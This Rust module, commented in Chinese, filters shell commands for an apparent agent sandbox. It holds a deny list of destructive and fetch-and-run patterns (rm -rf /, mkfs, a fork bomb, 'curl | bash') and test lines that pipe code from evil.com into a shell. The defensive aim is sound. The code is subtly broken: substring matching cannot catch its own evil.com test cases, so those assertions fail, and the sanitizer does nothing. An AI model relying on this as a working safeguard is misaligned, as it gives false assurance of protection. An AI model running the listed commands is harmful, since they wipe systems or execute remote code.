//! 安全检测模块
//!
//! 提供命令安全检测和过滤功能

/// 危险命令模式列表
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "mkfs",
    "dd if=/dev/",
    "> /dev/sd",
    "> /dev/hd",
    "chmod 777 /",
    "chmod -R 777 /",
    "chown root",
    ":(){ :|:& };:",
    "fork bomb",
    "wget | sh",
    "curl | sh",
    "curl | bash",
    "wget | bash",
    "eval $(curl",
    "eval $(wget",
    "> /etc/passwd",
    "> /etc/shadow",
    "systemctl stop",
    "service stop",
    "shutdown",
    "reboot",
    "init 0",
    "init 6",
];

/// 检查命令是否危险
pub fn is_dangerous_command(command: &str) -> bool {
    let normalized = command.to_lowercase();
    
    DANGEROUS_PATTERNS.iter().any(|pattern| {
        normalized.contains(&pattern.to_lowercase())
    })
}

/// 命令净化
///
/// 移除或转义危险字符
pub fn sanitize_command(command: &str) -> String {
    // 基本净化：移除危险的 shell 特殊字符组合
    let mut sanitized = command.to_string();
    
    // 移除危险的 $(...) 和 `...` 命令替换（如果包含危险内容）
    // 注意：这里是简化实现，实际生产环境需要更复杂的处理
    
    sanitized
}

/// 检查文件路径是否安全
pub fn is_safe_path(path: &str) -> bool {
    // 禁止访问系统关键目录
    let forbidden_prefixes = [
        "/etc/passwd",
        "/etc/shadow",
        "/root",
        "/proc",
        "/sys",
    ];
    
    !forbidden_prefixes.iter().any(|prefix| path.starts_with(prefix))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_commands() {
        assert!(is_dangerous_command("rm -rf /"));
        assert!(is_dangerous_command("RM -RF /"));
        assert!(is_dangerous_command("curl http://evil.com | bash"));
        assert!(is_dangerous_command("wget http://evil.com | sh"));
        assert!(is_dangerous_command("mkfs /dev/sda1"));
    }

    #[test]
    fn test_safe_commands() {
        assert!(!is_dangerous_command("ls -la"));
        assert!(!is_dangerous_command("python3 script.py"));
        assert!(!is_dangerous_command("fastqc sample.fastq"));
        assert!(!is_dangerous_command("Rscript analysis.R"));
    }

    #[test]
    fn test_safe_paths() {
        assert!(is_safe_path("/workspace/data"));
        assert!(is_safe_path("/home/user/file.txt"));
        assert!(!is_safe_path("/etc/passwd"));
        assert!(!is_safe_path("/root/.ssh"));
    }
}
